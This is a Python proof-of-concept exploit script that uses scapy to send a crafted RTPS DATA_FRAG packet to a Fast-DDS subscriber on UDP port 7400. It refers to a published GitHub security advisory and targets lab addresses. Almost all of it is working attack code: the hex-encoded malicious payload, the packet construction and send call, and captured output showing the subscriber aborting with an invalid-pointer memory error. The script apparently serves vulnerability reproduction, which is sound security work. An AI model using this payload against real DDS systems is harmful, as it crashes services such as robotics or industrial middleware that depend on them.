# -*- coding: utf-8 -*-
# @Auther: TesterCC
# @date  : 2026/1/16

# cve detail info: https://github.com/eProsima/Fast-DDS/security/advisories/GHSA-5m2f-hvj2-cx2h

from scapy.all import *
from scapy.layers.inet import UDP,IP
from scapy.layers.l2 import Ether

# 恶意 RTPS DATA_FRAG 载荷
hex_value = "525450530201ca00efe7c4e7d5eed6d6b901000016130000d6100000000000000000000000000010ffff00e2f2f2f2520201ca00efe700000100dd02"
abc = bytes.fromhex(hex_value)

# 目标信息（请根据实际情况修改）
# Bridge
target_ip = "10.29.2.107"     # 运行 HelloWorldExample 的机器 IP
target_mac = "00:0c:29:a2:4f:b7"  # ens37, 运行 HelloWorldExample 的机器 MAC

attacker_ip = "10.29.2.46"
attacker_mac = "B0:7B:25:28:C9:BD"

print(f"Sending malicious RTPS packet to {target_ip}...")

# 构造数据包，目标默认端口是7400，也有可能测试环境修改了默认端口
# 其实这里只发送一次报文就能使目标Subscriber crash
packet = Ether(src=attacker_mac, dst=target_mac) / \
        IP(src=attacker_ip, dst=target_ip) / \
        UDP(sport=57854, dport=7400) / abc

sendp(packet, iface="以太网", verbose=False)

"""
关于windows的iface

# 发送数据包，例如通过物理有线网卡
sendp(packet, iface="以太网", verbose=False)

# 或者通过VMware的VMnet8虚拟网卡
sendp(packet, iface="VMware Network Adapter VMnet8", verbose=False)
"""

"""
Subscriber running. Please press enter to stop the Subscriber
munmap_chunk(): invalid pointer
Aborted (core dumped)
"""